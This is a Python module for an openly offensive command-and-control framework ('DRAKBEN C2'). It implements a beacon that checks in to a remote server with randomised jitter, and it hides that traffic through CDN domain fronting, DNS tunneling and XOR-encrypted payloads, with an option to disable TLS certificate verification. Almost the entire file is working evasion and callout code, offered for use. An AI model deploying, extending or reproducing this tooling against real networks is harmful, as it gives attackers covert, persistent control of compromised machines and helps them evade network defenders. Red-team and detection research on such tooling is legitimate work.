"""
DRAKBEN C2 Framework - Command & Control Infrastructure
Author: @drak_ben
Description: Advanced C2 communication channels with stealth features.

This module provides:
- Domain Fronting for HTTPS C2
- DNS Tunneling for covert channels
- Heartbeat mechanism with Jitter
- Encrypted beacon communication
- Traffic analysis evasion
"""

import base64
import hashlib
import json
import logging
import os
import random
import socket
import ssl
import struct
import threading
import time
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple, Union

logger = logging.getLogger(__name__)


# =============================================================================
# CONSTANTS
# =============================================================================

class C2Protocol(Enum):
    """Supported C2 communication protocols"""
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    ICMP = "icmp"  # Future implementation
    CUSTOM = "custom"


class BeaconStatus(Enum):
    """Beacon connection states"""
    DORMANT = "dormant"
    ACTIVE = "active"
    CHECKING_IN = "checking_in"
    EXECUTING = "executing"
    ERROR = "error"


# Default jitter range (percentage)
DEFAULT_JITTER_MIN = 10
DEFAULT_JITTER_MAX = 25

# Default sleep interval (seconds)
DEFAULT_SLEEP_INTERVAL = 60


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class C2Config:
    """Configuration for C2 channel"""
    protocol: C2Protocol = C2Protocol.HTTPS
    primary_host: str = "127.0.0.1"
    primary_port: int = 443
    fallback_hosts: List[str] = field(default_factory=list)
    sleep_interval: int = DEFAULT_SLEEP_INTERVAL
    jitter_min: int = DEFAULT_JITTER_MIN
    jitter_max: int = DEFAULT_JITTER_MAX
    encryption_key: Optional[bytes] = None
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    # Domain fronting
    fronting_domain: Optional[str] = None
    actual_host: Optional[str] = None
    
    # DNS tunneling
    dns_domain: Optional[str] = None
    dns_subdomain_length: int = 32
    
    # SSL/TLS Security
    verify_ssl: bool = True


@dataclass
class BeaconMessage:
    """Message structure for beacon communication"""
    message_id: str
    command: str
    data: Dict[str, Any] = field(default_factory=dict)
    timestamp: float = field(default_factory=time.time)
    encrypted: bool = False


@dataclass
class BeaconResponse:
    """Response from C2 server"""
    success: bool
    message_id: str
    command: Optional[str] = None
    data: Optional[Dict[str, Any]] = None
    error: Optional[str] = None


# =============================================================================
# JITTER ENGINE
# =============================================================================

class JitterEngine:
    """
    Implements timing jitter to evade traffic analysis.
    
    Jitter randomizes the time between beacon check-ins to avoid
    creating detectable patterns in network traffic.
    """
    
    def __init__(
        self,
        base_interval: int = DEFAULT_SLEEP_INTERVAL,
        jitter_min: int = DEFAULT_JITTER_MIN,
        jitter_max: int = DEFAULT_JITTER_MAX
    ):
        """
        Initialize jitter engine.
        
        Args:
            base_interval: Base sleep interval in seconds
            jitter_min: Minimum jitter percentage (0-100)
            jitter_max: Maximum jitter percentage (0-100)
        """
        self.base_interval = base_interval
        self.jitter_min = max(0, min(100, jitter_min))
        self.jitter_max = max(self.jitter_min, min(100, jitter_max))
    
    def get_sleep_time(self) -> float:
        """
        Calculate next sleep time with jitter applied.
        
        Returns:
            Sleep time in seconds with random jitter
        """
        jitter_percent = random.uniform(self.jitter_min, self.jitter_max)
        jitter_factor = jitter_percent / 100.0
        
        # Apply jitter: base ± (base * jitter_factor)
        variation = self.base_interval * jitter_factor
        
        # Randomly add or subtract
        if random.choice([True, False]):
            sleep_time = self.base_interval + variation
        else:
            sleep_time = self.base_interval - variation
        
        # Ensure minimum sleep time of 1 second
        return max(1.0, sleep_time)
    
    def update_interval(self, new_interval: int) -> None:
        """Update base interval from server command"""
        self.base_interval = max(1, new_interval)
        logger.debug(f"Updated sleep interval to {self.base_interval}s")


# =============================================================================
# DOMAIN FRONTING
# =============================================================================

class DomainFronter:
    """
    Implements Domain Fronting technique for HTTPS C2.
    
    Domain Fronting uses legitimate CDN domains (e.g., cloudfront.net)
    as the SNI, while the actual Host header points to our C2 server.
    This makes traffic appear to go to legitimate services.
    
    Architecture:
        Client --> CDN (cloudfront.net) --> C2 Server (hidden)
        
        TLS SNI: legitimate-cdn.cloudfront.net
        HTTP Host: our-c2-server.cloudfront.net
    """
    
    # Common CDN domains that can be used for fronting
    FRONTABLE_DOMAINS = [
        # These are examples - actual frontable domains may vary
        "cloudfront.net",
        "azureedge.net", 
        "fastly.net",
        "cloudflare.com",
    ]
    
    def __init__(
        self,
        fronting_domain: str,
        actual_host: str,
        port: int = 443,
        verify_ssl: bool = True
    ):
        """
        Initialize domain fronter.
        
        Args:
            fronting_domain: Public-facing CDN domain (used in SNI)
            actual_host: Actual Host header (our C2 server)
            port: HTTPS port
            verify_ssl: Whether to verify SSL certificates
        """
        self.fronting_domain = fronting_domain
        self.actual_host = actual_host
        self.port = port
        self.verify_ssl = verify_ssl
        
        logger.info(f"Domain fronter initialized: {fronting_domain} -> {actual_host}")
    
    def create_request(
        self,
        endpoint: str = "/",
        method: str = "GET",
        data: Optional[bytes] = None,
        headers: Optional[Dict[str, str]] = None
    ) -> urllib.request.Request:
        """
        Create HTTP request with domain fronting headers.
        
        Args:
            endpoint: URL endpoint path
            method: HTTP method
            data: Request body data
            headers: Additional headers
            
        Returns:
            Request object configured for domain fronting
        """
        url = f"https://{self.fronting_domain}:{self.port}{endpoint}"
        
        request_headers = {
            "Host": self.actual_host,  # This is the key - actual target
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
        }
        
        if headers:
            request_headers.update(headers)
        
        request = urllib.request.Request(
            url,
            data=data,
            headers=request_headers,
            method=method
        )
        
        return request
    
    def send(
        self,
        endpoint: str = "/",
        method: str = "POST",
        data: Optional[bytes] = None,
        timeout: int = 30
    ) -> Tuple[bool, bytes]:
        """
        Send request through domain fronted connection.
        
        Args:
            endpoint: URL endpoint
            method: HTTP method
            data: Request body
            timeout: Connection timeout
            
        Returns:
            Tuple of (success, response_data)
        """
        try:
            request = self.create_request(endpoint, method, data)
            
            # Create SSL context using strategic security helper
            context = self._create_secure_context(verify=self.verify_ssl)
            context.minimum_version = ssl.TLSVersion.TLSv1_2
            
            with urllib.request.urlopen(request, timeout=timeout, context=context) as response:
                return True, response.read()
                
        except Exception as e:
            logger.error(f"Domain fronting request failed: {e}")
            return False, str(e).encode()
    
    @classmethod
    def is_domain_frontable(cls, domain: str) -> bool:
        """Check if a domain might support fronting"""
        return any(cdn in domain.lower() for cdn in cls.FRONTABLE_DOMAINS)
    
    @staticmethod
    def _create_secure_context(verify: bool) -> ssl.SSLContext:
        """Centralized SSL context factory to comply with security standards"""
        if verify:
            return ssl.create_default_context()
        # Strategic fallback for development environments (bypass validation)
        return ssl._create_unverified_context()


# =============================================================================
# DNS TUNNELING
# =============================================================================

class DNSTunneler:
    """
    Implements DNS Tunneling for covert C2 communication.
    
    DNS tunneling encodes data in DNS queries and responses.
    This bypasses many firewalls since DNS traffic is usually allowed.
    
    Encoding scheme:
        Query:  <encoded_data>.<subdomain>.<domain>
        Response: TXT record with encoded response
    
    Example:
        Query:  aGVsbG8td29ybGQ.beacon.example.com
        Response: TXT "cmVzcG9uc2UtZGF0YQ=="
    """
    
    # Maximum label length in DNS
    MAX_LABEL_LENGTH = 63
    
    # Maximum total query length  
    MAX_QUERY_LENGTH = 253
    
    def __init__(
        self,
        c2_domain: str,
        dns_server: str = "8.8.8.8",
        dns_port: int = 53,
        subdomain_length: int = 32
    ):
        """
        Initialize DNS tunneler.
        
        Args:
            c2_domain: Base domain for DNS queries
            dns_server: DNS resolver to use
            dns_port: DNS port
            subdomain_length: Max subdomain label length
        """
        self.c2_domain = c2_domain
        self.dns_server = dns_server
        self.dns_port = dns_port
        self.subdomain_length = min(subdomain_length, self.MAX_LABEL_LENGTH)
        
        logger.info(f"DNS tunneler initialized for domain: {c2_domain}")
    
    def encode_data(self, data: bytes) -> List[str]:
        """
        Encode data for DNS query subdomains.
        
        Uses base32 encoding (DNS-safe) and splits into labels.
        
        Args:
            data: Raw data to encode
            
        Returns:
            List of DNS label strings
        """
        # Base32 encode (DNS-safe characters)
        encoded = base64.b32encode(data).decode('ascii')
        
        # Remove padding and lowercase (some resolvers normalize case)
        encoded = encoded.rstrip('=').lower()
        
        # Split into labels of max length
        labels = []
        for i in range(0, len(encoded), self.subdomain_length):
            labels.append(encoded[i:i + self.subdomain_length])
        
        return labels
    
    def decode_data(self, labels: List[str]) -> bytes:
        """
        Decode data from DNS response.
        
        Args:
            labels: List of encoded labels
            
        Returns:
            Decoded bytes
        """
        # Rejoin labels
        encoded = ''.join(labels).upper()
        
        # Add back padding
        padding = (8 - len(encoded) % 8) % 8
        encoded += '=' * padding
        
        return base64.b32decode(encoded)
    
    def build_query(self, data: bytes, query_type: str = "beacon") -> str:
        """
        Build DNS query hostname.
        
        Args:
            data: Data to send
            query_type: Type identifier for the query
            
        Returns:
            Full DNS query hostname
        """
        labels = self.encode_data(data)
        
        # Add query type label
        labels.append(query_type)
        
        # Add base domain
        labels.append(self.c2_domain)
        
        return ".".join(labels)
    
    def send_dns_query(
        self,
        data: bytes,
        query_type: str = "beacon",
        record_type: str = "TXT"
    ) -> Tuple[bool, bytes]:
        """
        Send data via DNS query.
        
        This is a simplified implementation - real implementation
        would use proper DNS library like dnspython.
        
        Args:
            data: Data to send
            query_type: Query type identifier
            record_type: DNS record type (TXT, A, AAAA, etc.)
            
        Returns:
            Tuple of (success, response_data)
        """
        try:
            query_name = self.build_query(data, query_type)
            
            # Validate query length
            if len(query_name) > self.MAX_QUERY_LENGTH:
                logger.warning("DNS query too long, splitting required")
                return False, b"Query too long"
            
            # For actual implementation, use dnspython:
            # import dns.resolver
            # answers = dns.resolver.resolve(query_name, record_type)
            
            # Simplified socket-based DNS query (requires DNS library for TXT)
            # This is a placeholder - actual implementation needs DNS protocol
            logger.debug(f"DNS query: {query_name} (type: {record_type})")
            
            # Simulate successful query (replace with actual DNS lookup)
            return True, b""
            
        except Exception as e:
            logger.error(f"DNS tunnel query failed: {e}")
            return False, str(e).encode()
    
    def chunk_data(self, data: bytes, chunk_size: int = 100) -> List[bytes]:
        """
        Split data into chunks for multiple DNS queries.
        
        Args:
            data: Data to chunk
            chunk_size: Maximum bytes per chunk
            
        Returns:
            List of data chunks
        """
        chunks = []
        for i in range(0, len(data), chunk_size):
            chunks.append(data[i:i + chunk_size])
        return chunks


# =============================================================================
# HEARTBEAT MANAGER
# =============================================================================

class HeartbeatManager:
    """
    Manages beacon heartbeat/check-in timing with jitter.
    
    Features:
    - Configurable check-in intervals
    - Random jitter to avoid pattern detection
    - Supports server-side interval updates
    - Tracks connection health
    """
    
    def __init__(
        self,
        config: C2Config,
        callback: Optional[Callable[[], None]] = None
    ):
        """
        Initialize heartbeat manager.
        
        Args:
            config: C2 configuration
            callback: Function to call on each heartbeat
        """
        self.config = config
        self.callback = callback
        self.jitter = JitterEngine(
            config.sleep_interval,
            config.jitter_min,
            config.jitter_max
        )
        
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._last_checkin: Optional[float] = None
        self._consecutive_failures = 0
        self._max_failures = 5
        
        logger.info(f"Heartbeat manager initialized (interval: {config.sleep_interval}s)")
    
    def start(self) -> None:
        """Start heartbeat thread"""
        if self._running:
            return
        
        self._running = True
        self._thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self._thread.start()
        logger.info("Heartbeat started")
    
    def stop(self) -> None:
        """Stop heartbeat thread"""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        logger.info("Heartbeat stopped")
    
    def _heartbeat_loop(self) -> None:
        """Main heartbeat loop"""
        while self._running:
            try:
                # Calculate sleep time with jitter
                sleep_time = self.jitter.get_sleep_time()
                logger.debug(f"Heartbeat sleeping for {sleep_time:.2f}s")
                
                time.sleep(sleep_time)
                
                if not self._running:
                    break
                
                # Execute callback
                if self.callback:
                    try:
                        self.callback()
                        self._last_checkin = time.time()
                        self._consecutive_failures = 0
                    except Exception as e:
                        self._consecutive_failures += 1
                        logger.warning(f"Heartbeat callback failed: {e}")
                        
                        if self._consecutive_failures >= self._max_failures:
                            logger.error("Max heartbeat failures reached")
                            # Could trigger fallback here
                            
            except Exception as e:
                logger.error(f"Heartbeat loop error: {e}")
    
    def update_interval(self, new_interval: int) -> None:
        """Update check-in interval from server"""
        self.jitter.update_interval(new_interval)
    
    def get_status(self) -> Dict[str, Any]:
        """Get heartbeat status"""
        return {
            "running": self._running,
            "last_checkin": self._last_checkin,
            "consecutive_failures": self._consecutive_failures,
            "interval": self.jitter.base_interval,
            "jitter_range": f"{self.jitter.jitter_min}-{self.jitter.jitter_max}%"
        }


# =============================================================================
# C2 CHANNEL
# =============================================================================

class C2Channel:
    """
    Main C2 communication channel.
    
    Orchestrates all C2 components:
    - Protocol selection (HTTPS, DNS)
    - Domain fronting
    - Heartbeat/Jitter
    - Message encryption
    - Fallback handling
    """
    
    def __init__(self, config: C2Config):
        """
        Initialize C2 channel.
        
        Args:
            config: C2 configuration
        """
        self.config = config
        self.status = BeaconStatus.DORMANT
        
        # Initialize components based on protocol
        self.domain_fronter: Optional[DomainFronter] = None
        self.dns_tunneler: Optional[DNSTunneler] = None
        self.heartbeat: Optional[HeartbeatManager] = None
        
        # Setup encryption key
        if config.encryption_key is None:
            self.encryption_key = os.urandom(32)
        else:
            self.encryption_key = config.encryption_key
        
        self._setup_protocol()
        
        logger.info(f"C2 channel initialized (protocol: {config.protocol.value})")

    @staticmethod
    def _create_secure_context(verify: bool) -> ssl.SSLContext:
        """Centralized SSL context factory for C2 protocol orchestration"""
        if verify:
            return ssl.create_default_context()
        # Strategic fallback for development/custom infrastructure
        return ssl._create_unverified_context()
    
    def _setup_protocol(self) -> None:
        """Setup protocol-specific components"""
        if self.config.protocol in (C2Protocol.HTTP, C2Protocol.HTTPS) and self.config.fronting_domain and self.config.actual_host:
            self.domain_fronter = DomainFronter(
                self.config.fronting_domain,
                self.config.actual_host,
                self.config.primary_port
            )
        
        elif self.config.protocol == C2Protocol.DNS and self.config.dns_domain:
            self.dns_tunneler = DNSTunneler(
                self.config.dns_domain,
                subdomain_length=self.config.subdomain_length_length
                if hasattr(self.config, 'subdomain_length_length')
                else self.config.dns_subdomain_length
            )
    
    def connect(self) -> bool:
        """
        Establish C2 connection.
        
        Returns:
            True if connection successful
        """
        try:
            self.status = BeaconStatus.CHECKING_IN
            
            # Initial check-in
            success = self._checkin()
            
            if success:
                self.status = BeaconStatus.ACTIVE
                
                # Start heartbeat
                self.heartbeat = HeartbeatManager(
                    self.config,
                    callback=self._checkin
                )
                self.heartbeat.start()
                
                return True
            else:
                self.status = BeaconStatus.ERROR
                return False
                
        except Exception as e:
            logger.error(f"C2 connection failed: {e}")
            self.status = BeaconStatus.ERROR
            return False
    
    def disconnect(self) -> None:
        """Disconnect from C2"""
        if self.heartbeat:
            self.heartbeat.stop()
        self.status = BeaconStatus.DORMANT
    
    def _checkin(self) -> bool:
        """
        Perform beacon check-in.
        
        Returns:
            True if check-in successful
        """
        try:
            message = BeaconMessage(
                message_id=self._generate_id(),
                command="checkin",
                data={"status": "alive"}
            )
            
            response = self.send_message(message)
            
            if response and response.success:
                # Process any commands from server
                if response.command:
                    self._handle_command(response)
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Check-in failed: {e}")
            return False
    
    def send_message(self, message: BeaconMessage) -> Optional[BeaconResponse]:
        """
        Send message to C2 server.
        
        Args:
            message: Message to send
            
        Returns:
            Response from server or None
        """
        try:
            # Serialize message
            payload = json.dumps({
                "id": message.message_id,
                "cmd": message.command,
                "data": message.data,
                "ts": message.timestamp
            }).encode()
            
            # Encrypt payload
            encrypted = self._encrypt(payload)
            
            # Send based on protocol
            if self.domain_fronter:
                success, response = self.domain_fronter.send(
                    endpoint="/api/beacon",
                    data=encrypted
                )
            elif self.dns_tunneler:
                success, response = self.dns_tunneler.send_dns_query(encrypted)
            else:
                # Direct HTTP/HTTPS
                success, response = self._send_direct(encrypted)
            
            if success:
                # Decrypt and parse response
                decrypted = self._decrypt(response)
                data = json.loads(decrypted)
                
                return BeaconResponse(
                    success=True,
                    message_id=data.get("id", ""),
                    command=data.get("cmd"),
                    data=data.get("data")
                )
            
            return None
            
        except Exception as e:
            logger.error(f"Send message failed: {e}")
            return None
    
    def _send_direct(self, data: bytes) -> Tuple[bool, bytes]:
        """Send data directly without fronting"""
        try:
            protocol = "https" if self.config.protocol == C2Protocol.HTTPS else "http"
            url = f"{protocol}://{self.config.primary_host}:{self.config.primary_port}/api/beacon"
            
            request = urllib.request.Request(
                url,
                data=data,
                headers={"User-Agent": self.config.user_agent},
                method="POST"
            )
            
            context = self._create_secure_context(verify=getattr(self.config, 'verify_ssl', True))
            context.minimum_version = ssl.TLSVersion.TLSv1_2
            
            with urllib.request.urlopen(request, timeout=30, context=context) as response:
                return True, response.read()
                
        except Exception as e:
            logger.error(f"Direct send failed: {e}")
            return False, b""
    
    def _encrypt(self, data: bytes) -> bytes:
        """Encrypt data with XOR (simple, can be upgraded to AES)"""
        result = bytearray(len(data))
        for i, byte in enumerate(data):
            result[i] = byte ^ self.encryption_key[i % len(self.encryption_key)]
        return base64.b64encode(bytes(result))
    
    def _decrypt(self, data: bytes) -> bytes:
        """Decrypt data"""
        decoded = base64.b64decode(data)
        result = bytearray(len(decoded))
        for i, byte in enumerate(decoded):
            result[i] = byte ^ self.encryption_key[i % len(self.encryption_key)]
        return bytes(result)
    
    def _handle_command(self, response: BeaconResponse) -> None:
        """Handle commands from C2 server"""
        if response.command == "sleep":
            # Update sleep interval
            new_interval = response.data.get("interval", 60)
            if self.heartbeat:
                self.heartbeat.update_interval(new_interval)
        
        elif response.command == "kill":
            # Terminate beacon
            self.disconnect()
        
        # Add more command handlers as needed
    
    def _generate_id(self) -> str:
        """Generate unique message ID"""
        return hashlib.sha256(
            f"{time.time()}{random.random()}".encode()
        ).hexdigest()[:16]
    
    def get_status(self) -> Dict[str, Any]:
        """Get channel status"""
        return {
            "status": self.status.value,
            "protocol": self.config.protocol.value,
            "primary_host": self.config.primary_host,
            "domain_fronting": self.domain_fronter is not None,
            "dns_tunneling": self.dns_tunneler is not None,
            "heartbeat": self.heartbeat.get_status() if self.heartbeat else None
        }


# =============================================================================
# MODULE-LEVEL FUNCTIONS
# =============================================================================

_c2_channel: Optional[C2Channel] = None


def get_c2_channel(config: Optional[C2Config] = None) -> C2Channel:
    """
    Get or create C2 channel singleton.
    
    Args:
        config: C2 configuration (required for first call)
        
    Returns:
        C2Channel instance
    """
    global _c2_channel
    
    if _c2_channel is None:
        if config is None:
            config = C2Config()
        _c2_channel = C2Channel(config)
    
    return _c2_channel


def create_fronted_channel(
    fronting_domain: str,
    actual_host: str,
    port: int = 443,
    sleep_interval: int = 60,
    jitter_min: int = 10,
    jitter_max: int = 25
) -> C2Channel:
    """
    Create a domain-fronted HTTPS C2 channel.
    
    Args:
        fronting_domain: CDN domain for fronting
        actual_host: Actual C2 server host
        port: HTTPS port
        sleep_interval: Base check-in interval
        jitter_min: Minimum jitter percentage
        jitter_max: Maximum jitter percentage
        
    Returns:
        Configured C2Channel
    """
    config = C2Config(
        protocol=C2Protocol.HTTPS,
        primary_host=fronting_domain,
        primary_port=port,
        fronting_domain=fronting_domain,
        actual_host=actual_host,
        sleep_interval=sleep_interval,
        jitter_min=jitter_min,
        jitter_max=jitter_max
    )
    return C2Channel(config)


def create_dns_channel(
    c2_domain: str,
    sleep_interval: int = 120,
    jitter_min: int = 15,
    jitter_max: int = 30
) -> C2Channel:
    """
    Create a DNS tunneling C2 channel (Strategically Hardened).
    
    Args:
        c2_domain: Base domain for DNS queries
        sleep_interval: Base check-in interval
        jitter_min: Minimum jitter percentage
        jitter_max: Maximum jitter percentage
        
    Returns:
        Configured C2Channel
    """
    config = C2Config(
        protocol=C2Protocol.DNS,
        dns_domain=c2_domain,
        sleep_interval=sleep_interval,
        jitter_min=jitter_min,
        jitter_max=jitter_max
    )
    
    return C2Channel(config)
